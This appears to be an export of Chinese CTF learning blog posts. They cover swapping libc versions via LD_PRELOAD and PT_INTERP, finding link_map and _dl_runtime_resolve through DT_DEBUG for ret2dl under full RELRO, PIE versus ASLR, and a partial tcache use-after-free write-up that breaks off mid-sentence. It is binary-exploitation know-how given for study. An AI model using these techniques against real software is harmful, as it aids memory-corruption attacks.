[{"title":"ubuntu加载不同版本libc","url":"/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-VrOVGeUt\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h4 id=\"1）review\"><a href=\"#1）review\" class=\"headerlink\" title=\"1）review\"></a>1）review</h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>\n<p>然后我就是这样一步一步地变得不会调试的。</p>\n<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>\n<p>呜呜呜，我居然一直忽略了它的灵魂</p>\n<p>所以这一次我一定要解决掉这个问题。</p>\n<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>\n<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>\n<h4 id=\"2）原理\"><a href=\"#2）原理\" class=\"headerlink\" title=\"2）原理\"></a>2）原理</h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>\n<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>\n<h5 id=\"1）LD-PRELOAD\"><a href=\"#1）LD-PRELOAD\" class=\"headerlink\" title=\"1）LD_PRELOAD\"></a>1）LD_PRELOAD</h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;</code></p>\n<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>\n<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>\n<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>\n<h5 id=\"2）LD-LIBRARY-PATH和LIBRARY-PATH\"><a href=\"#2）LD-LIBRARY-PATH和LIBRARY-PATH\" class=\"headerlink\" title=\"2）LD_LIBRARY_PATH和LIBRARY_PATH\"></a>2）LD_LIBRARY_PATH和LIBRARY_PATH</h5><p>LD_LIBRARY_PATH用于在<em><strong>程序加载运行期间</strong></em>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>\n<p>LIBRARY_PATH环境变量用于在<em><strong>程序编译期间</strong></em>查找动态链接库时指定查找共享库的路径</p>\n<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>\n<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>\n<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>\n<h5 id=\"1）-PT-INTERP\"><a href=\"#1）-PT-INTERP\" class=\"headerlink\" title=\"1） PT_INTERP\"></a>1） PT_INTERP</h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>\n<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>\n<h4 id=\"汇总\"><a href=\"#汇总\" class=\"headerlink\" title=\"汇总\"></a>汇总</h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>\n<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>\n<h4 id=\"实际操作\"><a href=\"#实际操作\" class=\"headerlink\" title=\"实际操作\"></a>实际操作</h4><p>我们以lonelywolf为例。</p>\n<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.cnblogs.com/net66/p/5609026.html\"><a href=\"https://www.cnblogs.com/net66/p/5609026.html\">LD_PRELOAD的偷梁换柱之能</a></a></p>\n","categories":["MESS"],"tags":["linux primary"]},{"title":"ret2dl_advanced","url":"/2021/08/02/ret2dl_advanced/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-dahofNtS\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"ret2dl-advanced\"><a href=\"#ret2dl-advanced\" class=\"headerlink\" title=\"ret2dl_advanced\"></a>ret2dl_advanced</h2><h3 id=\"1-review\"><a href=\"#1-review\" class=\"headerlink\" title=\"1)review\"></a>1)review</h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>\n<p>但是我们仍然能够找到某种方式来getshell。</p>\n<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>\n<p>(Ps:为什么找不到相关的中文文章)</p>\n<h3 id=\"2）dt-dbg？\"><a href=\"#2）dt-dbg？\" class=\"headerlink\" title=\"2）dt_dbg？\"></a>2）dt_dbg？</h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>\n<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>\n<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>\n<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>\n<p><code>r_debug</code>具体代码如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">r_debug</span></span></span><br><span class=\"line\"><span class=\"class\">  &#123;</span> </span><br><span class=\"line\">    <span class=\"keyword\">int</span> r_version;              <span class=\"comment\">/* Version number for this protocol. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">r_map</span>;</span>     <span class=\"comment\">/* Head of the chain of loaded objects. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */</span></span><br><span class=\"line\">    ElfW(Addr) r_brk;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span></span></span><br><span class=\"line\"><span class=\"class\">      &#123;</span> </span><br><span class=\"line\">        <span class=\"comment\">/* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */</span></span><br><span class=\"line\">        RT_CONSISTENT,          <span class=\"comment\">/* Mapping change is complete. */</span></span><br><span class=\"line\">        RT_ADD,                 <span class=\"comment\">/* Beginning to add a new object. */</span></span><br><span class=\"line\">        RT_DELETE               <span class=\"comment\">/* Beginning to remove an object mapping. */</span></span><br><span class=\"line\">      &#125; r_state;</span><br><span class=\"line\"></span><br><span class=\"line\">    ElfW(Addr) r_ldbase;        <span class=\"comment\">/* Base address the linker is loaded at. */</span></span><br><span class=\"line\">  &#125;;</span><br></pre></td></tr></table></figure>\n\n<p>实操一遍</p>\n<p>随便写一个无output的栈溢出。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">fur1n@ubuntu:~/pwn$ readelf -d ret2dl</span><br><span class=\"line\"></span><br><span class=\"line\">Dynamic section at offset 0xdb8 contains 27 entries:</span><br><span class=\"line\">  Tag        Type                         Name/Value</span><br><span class=\"line\">...</span><br><span class=\"line\"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在没有运行的时候<code>dt_dbg</code>为空。</p>\n<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>\n<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>\n<p>段的地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/50gx 0x600e20</span><br><span class=\"line\">...</span><br><span class=\"line\">0x600ee0:\t0x0000000000000015\t0x00007ffff7ffe140</span><br></pre></td></tr></table></figure>\n\n<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20gx 0x00007ffff7ffe140</span><br><span class=\"line\">0x7ffff7ffe140 &lt;_r_debug&gt;:\t0x0000000000000001\t0x00007ffff7ffe170</span><br><span class=\"line\">0x7ffff7ffe150 &lt;_r_debug+16&gt;:\t0x00007ffff7de3f40\t0x0000000000000000</span><br><span class=\"line\">0x7ffff7ffe160 &lt;_r_debug+32&gt;:\t0x00007ffff7dd3000\t0x0000000000000000</span><br><span class=\"line\">0x7ffff7ffe170:\t0x0000000000000000\t0x00007ffff7ffe700</span><br><span class=\"line\">0x7ffff7ffe180:\t0x0000000000600e20\t0x00007ffff7ffe710</span><br><span class=\"line\">0x7ffff7ffe190:\t0x0000000000000000\t0x00007ffff7ffe170</span><br><span class=\"line\">0x7ffff7ffe1a0:\t0x0000000000000000\t0x00007ffff7ffe6e8</span><br><span class=\"line\">0x7ffff7ffe1b0:\t0x0000000000000000\t0x0000000000600e20</span><br><span class=\"line\">0x7ffff7ffe1c0:\t0x0000000000600f00\t0x0000000000600ef0</span><br><span class=\"line\">0x7ffff7ffe1d0:\t0x0000000000000000\t0x0000000000600ea0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x7ffff7ffe140 &lt;_r_debug&gt;:\t0x0000000000000001\t0x00007ffff7ffe170</span><br></pre></td></tr></table></figure>\n\n<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>\n<p>虽然但是。</p>\n<p>只是找到<code>link_map</code>没啥用。</p>\n<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>\n<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>\n<p>那么如何寻找呢？</p>\n<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>\n<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>\n<p><code>dl_runtime_resolve</code>。</p>\n<p>首先我们找到<code>libc.so.6</code>文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20gx 0x00007ffff7ffe170</span><br><span class=\"line\">0x7ffff7ffe170:\t0x0000000000000000\t0x00007ffff7ffe700</span><br><span class=\"line\">0x7ffff7ffe180:\t0x0000000000600e20\t0x00007ffff7ffe710</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/20gx 0x00007ffff7ffe700</span><br><span class=\"line\">0x7ffff7ffe700:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7ffff7ffe710:\t0x00007ffff7ffb000\t0x00007ffff7ffebb0</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/s 0x00007ffff7ffebb0</span><br><span class=\"line\">0x7ffff7ffebb0:\t<span class=\"string\">&quot;linux-vdso.so.1&quot;</span></span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x00007ffff7ffe710</span><br><span class=\"line\">0x7ffff7ffe710:\t0x00007ffff7ffb000\t0x00007ffff7ffebb0</span><br><span class=\"line\">0x7ffff7ffe720:\t0x00007ffff7ffb3a0\t0x00007ffff7fe2000</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x00007ffff7fe2000</span><br><span class=\"line\">0x7ffff7fe2000:\t0x00007ffff79e2000\t0x00007ffff7ffedd0</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/s 0x00007ffff7ffedd0</span><br><span class=\"line\">0x7ffff7ffedd0:\t<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>即<code>0x00007ffff7ffedd0</code>。</p>\n<p>0x3即<code>GOT[]</code>入口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/30gx 0x00007ffff7dccb80</span><br><span class=\"line\">...</span><br><span class=\"line\">0x7ffff7dccc30:\t0x0000000000000003\t0x00007ffff7dcd000</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>找到GOT[3]</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/5gx 0x00007ffff7dcd000</span><br><span class=\"line\">0x7ffff7dcd000:\t0x00000000003eab80\t0x00007ffff7fe2000</span><br><span class=\"line\">0x7ffff7dcd010:\t0x00007ffff7dea8f0\t0x00007ffff7b70a10</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; xinfo 0x00007ffff7dea8f0</span><br><span class=\"line\">Extended information <span class=\"keyword\">for</span> virtual address 0x7ffff7dea8f0:</span><br><span class=\"line\"></span><br><span class=\"line\">  Containing mapping:</span><br><span class=\"line\">    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class=\"line\"></span><br><span class=\"line\">  Offset information:</span><br><span class=\"line\">         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0</span><br><span class=\"line\">         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0</span><br><span class=\"line\">      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0</span><br><span class=\"line\">         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0</span><br><span class=\"line\"></span><br><span class=\"line\"> Containing ELF sections:</span><br><span class=\"line\">               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3）exploitation\"><a href=\"#3）exploitation\" class=\"headerlink\" title=\"3）exploitation\"></a>3）exploitation</h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>\n<p>有aslr的情况。。</p>\n<p>我也不会。</p>\n<h3 id=\"4-refrence\"><a href=\"#4-refrence\" class=\"headerlink\" title=\"4)refrence\"></a>4)refrence</h3><p><a href=\"http://rk700.github.io/2015/04/09/dt_debug-read/\">通过DT_DEBUG来获得各个库的基址</a></p>\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico\">How the ELF Ruined Christmas</a></p>\n<p><a href=\"https://ypl.coffee/dl-resolve-full-relro/\">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>\n<p>————————————————tbc——————————————————-</p>\n","categories":["STACK - ret2dlsolve"],"tags":["stack"]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","url":"/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-PQrJuWeR\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"ELF文件下对于PIE保护和ASLR的重新认识\"><a href=\"#ELF文件下对于PIE保护和ASLR的重新认识\" class=\"headerlink\" title=\"ELF文件下对于PIE保护和ASLR的重新认识\"></a>ELF文件下对于PIE保护和ASLR的重新认识</h3><h4 id=\"0）\"><a href=\"#0）\" class=\"headerlink\" title=\"0）\"></a>0）</h4><p>​    复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。</p>\n<h4 id=\"1）\"><a href=\"#1）\" class=\"headerlink\" title=\"1）\"></a>1）</h4><p>​    如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。</p>\n<p>ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。</p>\n<p>也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。</p>\n<p>在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。</p>\n<p>这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。</p>\n<p>PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。</p>\n<p>​    然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。</p>\n","categories":["MESS"],"tags":["mess"]},{"title":"Tcahce学习","url":"/2021/08/17/Tcache%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-ygeXUkvP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h1 id=\"Tcahce学习\"><a href=\"#Tcahce学习\" class=\"headerlink\" title=\"Tcahce学习\"></a>Tcahce学习</h1><h2 id=\"0）review\"><a href=\"#0）review\" class=\"headerlink\" title=\"0）review\"></a>0）review</h2><p>说是Tcache学习，实际上是lonelywolf的复现。</p>\n<p>网上wp都是神仙写的，一点也不萌新友好。我都看不懂（）</p>\n<p>打开题发现这个菜单题好常规。</p>\n<p>但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。                                                                                                   具体的参考可以看<a href=\"https://blog.csdn.net/chennbnbnb/article/details/109284780\">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a>。但是在这道题里面充其量算一个trick而不是核心考点。</p>\n<h2 id=\"1）漏洞点\"><a href=\"#1）漏洞点\" class=\"headerlink\" title=\"1）漏洞点\"></a>1）漏洞点</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> __int64 <span class=\"title\">delete</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v1; <span class=\"comment\">// [rsp+0h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Index: &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(&amp;number, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !v1 &amp;&amp; buf )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>漏洞点。经典uaf。</p>\n<p>之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          read(<span class=\"number\">0</span>, v0, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( *v0 == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( ++v0 == v1 )</span><br><span class=\"line\">            <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        *v0 = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n\n<p>然后有一个比较怪的点就是这里的 <code> __readfsqword();</code>。很明显他是一个和读取有关的函数，但是ida根本点不进去。</p>\n<p>后面我才知道这个函数是和canary保护有关。</p>\n<p>根据微软官方文档<a href=\"https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-160\">…</a>这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。</p>\n<p>但是好像说了和没说一样。</p>\n<p>回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。<a href=\"https://toutiao.io/posts/o5yed8w/preview\">Canary安全机制原理实战分析</a></p>\n<p>![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png)</p>\n<h2 id=\"2）漏洞利用\"><a href=\"#2）漏洞利用\" class=\"headerlink\" title=\"2）漏洞利用\"></a>2）漏洞利用</h2><h3 id=\"1）Tcache-double-free\"><a href=\"#1）Tcache-double-free\" class=\"headerlink\" title=\"1）Tcache double free\"></a>1）Tcache double free</h3><p>之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。</p>\n<p>虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x68</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">pause()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>首先先分配再释放一下，看看这个题具体的内存分布有什么特点。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; hea</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55e9c994c000</span><br><span class=\"line\">Size: 0x251</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55e9c994c250</span><br><span class=\"line\">Size: 0x71</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55e9c994c2c0</span><br><span class=\"line\">Size: 0x20d41</span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; bin</span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">0x70 [  1]: 0x55e9c994c260 ◂— 0x0</span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>之前一直不是很清楚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x55e9c994c000</span></span><br><span class=\"line\">Size: <span class=\"number\">0x251</span></span><br></pre></td></tr></table></figure>\n\n<p>这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。</p>\n<p>然后这边</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x70</span> [  <span class=\"number\">1</span>]: <span class=\"number\">0x55e9c994c260</span> ◂— <span class=\"number\">0x0</span> <span class=\"comment\">//说明0x70大小的Tcache里只有一个Tcache chunk，</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/300gx 0x562fcfd39000</span><br><span class=\"line\">0x562fcfd39000:\t0x0000000000000000\t0x0000000000000251</span><br><span class=\"line\">0x562fcfd39010:\t0x0000010000000000\t0x0000000000000000</span><br><span class=\"line\">0x562fcfd39020:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x562fcfd39030:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x562fcfd39040:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x562fcfd39050:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x562fcfd39060:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x562fcfd39070:\t0x0000000000000000\t0x0000562fcfd39260</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这是控制堆块的部分结构</p>\n<p><code>0x562fcfd39010:    0x0000010000000000    0x0000000000000000</code>中，1说明只有一个Tcache。</p>\n<p>T擦车堆块的首地址也记录在内。从<code>0x562fcfd39050</code>开始分别记录0x20到0x70的Tcache chunk的首地址，比如<code>0x562fcfd39070:    0x0000000000000000    